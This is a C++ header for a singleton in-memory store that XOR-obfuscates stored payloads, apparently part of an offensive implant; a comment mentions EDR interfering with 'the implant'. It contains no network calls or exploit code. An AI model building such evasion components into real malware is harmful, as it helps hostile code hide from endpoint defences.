/**
 * @file memstore.h
 * @brief Defines a singleton in-memory storage manager with basic XOR obfuscation.
 */

#pragma once
#include <map>
#include <string>
#include <vector>
#include <iostream>
#include <windows.h>
#include "_debug/debug.h"

/**
 * @brief Applies a repeating-key XOR operation to a data buffer in place.
 * * @param data A pointer to the byte array to be modified.
 * @param data_size The total number of bytes in the data buffer.
 * @param key A pointer to the character array representing the encryption/decryption key.
 * @param key_size The length of the key.
 */
//uses c types for simplicity, easier to do this, and just pass  in values from c++ types as needed.
void XOR(unsigned char* data, size_t data_size, const char* key, size_t key_size) {
    DEBUG_LOG("[XOR] Processing buffer of size: " + std::to_string(data_size) + " with key size: " + std::to_string(key_size));
    for (size_t i = 0; i < data_size; i++) {
        /*
        int division is a bit weird. Note here so I don't have to re-figure this out again later.

        key = 1, key_len = 4. 1/4 is normally .25. an int can't have a decimal.
        That means 0/4 is 0, with 1 left over (again, 1/4 is invalid, as we can't make a whole number out of it,
        so 1 is the remainder that does not fit in the whole number)

        Ex, box of pizza. Need 4 pieces to fill a box, and a box cannot be sold without 4 pieces.
        if you make 1, or 5 pieces, you can't make a box, so you have one "left over".

        That's what this does below.

        first loop would be:
        data[0] = data[0] ^ key [0 % 4] (which is 0, no remainder left over)
        data[1] = data[1] ^ key [1 % 4] (which is 1, the remainder)
        data[2] = data[2] ^ key [2 % 4] (which is 2, the remainder)
        data[3] = data[3] ^ key [3 % 4] (which is 3, the remainder)
        data[4] = data[4] ^ key [4 % 4] (which is 4/4, aka 1, the remainer is 0)
        data[5] = data[5] ^ key [5 % 4] (which is 5/4, the remainer is 1)
        ... and so on
        */

        data[i] = data[i] ^ key[i % key_size];
    }
}

/**
 * @class MemStore
 * @brief A thread-local/Singleton key-value store that keeps payloads and data obfuscated in memory.
 */
class MemStore {
public:
    /**
     * @brief Accesses the global Singleton instance of the MemStore.
     * @return MemStore& A reference to the static instance.
     */
    // This is the global access point. 
    // It creates the instance the first time it's called, and returns it forever after.
    static MemStore& instance() {
        DEBUG_LOG("[MemStore::instance] Accessing Singleton Instance");
        static MemStore instance; // Guaranteed to be destroyed, instantiated on first use.
        return instance;
    }

    /**
     * @brief Deleted copy constructor to enforce Singleton pattern.
     */
    // Delete copy constructor and assignment operator to prevent duplicates
    MemStore(const MemStore&) = delete;

    /**
     * @brief Deleted assignment operator to enforce Singleton pattern.
     */
    void operator=(const MemStore&) = delete;

    /**
     * @brief Obfuscates and stores a byte vector in memory under a specific key.
     * * @param key The string identifier for the stored data. This is also used as the XOR key.
     * @param data The raw byte payload to be encrypted and stored.
     * @return int Returns ERROR_SUCCESS on successful storage, or ERROR_FUNCTION_FAILED if the map size did not change.
     */
    //note, call with std::move(data) to truly pass ownership. 
    //tldr, we don't want more copies of what is being stored, in memory for longer than they need to be
    int store(const std::string& key, std::vector<uint8_t> data) {
        DEBUG_LOG("[MemStore::store] Storing data under key: " + key + " (Size: " + std::to_string(data.size()) + ")");
        size_t size_of_memstore_before_insertion = memstore_map_.size();

        //memoty store XOR. For now, xoring the data with the map key name lmao. Not great but its easy.
        //also - giving the vector directly to XOR to modify it, rather than creating a copy
        XOR(data.data(), data.size(), key.c_str(), key.size());

        //move is called again here, to move the passed data, to the key, rather than copying. 
        memstore_map_[key] = std::move(data);


        size_t size_of_memstore_after_insertion = memstore_map_.size();
        if (size_of_memstore_before_insertion + 1 == size_of_memstore_after_insertion) {
            DEBUG_LOG("[MemStore::store] Successfully stored key: " + key);
            return ERROR_SUCCESS;
        }

        DEBUG_LOG("[MemStore::store] FAILED to store key: " + key);
        //generic functionfailed, desc is: "Function failed during execution"
        return ERROR_FUNCTION_FAILED;
    }

    /**
     * @brief Removes a specified key and its associated data from the store.
     * * @param key The string identifier of the data to remove.
     * @return int Returns ERROR_SUCCESS if removed, or ERROR_NOT_FOUND if the key did not exist.
     */
    int remove(const std::string& key) {
        DEBUG_LOG("[MemStore::remove] Attempting to remove key: " + key);
        auto it = memstore_map_.find(key);

        if (it != memstore_map_.end()) {
            memstore_map_.erase(it);
            DEBUG_LOG("[MemStore::remove] Successfully removed key: " + key);
            return ERROR_SUCCESS;
        }
        DEBUG_LOG("[MemStore::remove] Key not found for removal: " + key);
        return ERROR_NOT_FOUND;
    }

    /**
     * @brief Completely clears all entries from the memory store.
     * * @return int Returns ERROR_SUCCESS after clearing the map.
     */
    int clear() {
        DEBUG_LOG("[MemStore::clear] Clearing all entries from MemStore. Current count: " + std::to_string(memstore_map_.size()));
        //clear sets size to 0, and removes elemnts
        memstore_map_.clear();

        //disregarding this check for now. clear is guaranteed to clear, my only concern is that an EDR
        // could set the page to readonly, etc and when trying to clear, the implant gets a 5 access denied/not everything is cleared.
        //if (memstore_map_.size() > 0) {
        //}

        return ERROR_SUCCESS;
    }

    /**
     * @brief Enumerates all keys currently held in the memory store.
     * * @return std::vector<std::string> A vector containing the names of all stored keys.
     */
    std::vector<std::string> get_file_names() {
        DEBUG_LOG("[MemStore::get_file_names] Enumerating stored keys");
        std::vector<std::string> key_names{};
        for (const auto& [key, value] : memstore_map_) {
            key_names.push_back(key);
        }
        return key_names;
    }

    /**
     * @brief Retrieves and de-obfuscates the data associated with a given key.
     * * @param key The string identifier of the data to retrieve.
     * @return std::vector<uint8_t> The decrypted byte payload, or an empty vector if the key was not found.
     */
    std::vector<uint8_t> get(const std::string& key) const {
        DEBUG_LOG("[MemStore::get] Retrieving data for key: " + key);
        auto it = memstore_map_.find(key);

        if (it != memstore_map_.end()) {
            DEBUG_LOG("[MemStore::get] Key found. Decrypting data...");
            std::vector<uint8_t> data{ it->second.begin(), it->second.end() };
            XOR(data.data(), data.size(), key.c_str(), key.size());

            return data;
        }
        DEBUG_LOG("[MemStore::get] Key NOT found: " + key);
        return {};
    }

private:
    /**
     * @brief Private constructor to prevent direct instantiation.
     */
    // Private Constructor: Only the instance() method can create this.
    //init's the class, which allows the instance to be available
    MemStore() {
        // No specific initialization needed for now
    }

    std::map<std::string, std::vector<uint8_t>> memstore_map_; ///< Internal map storing the obfuscated key-value pairs.
};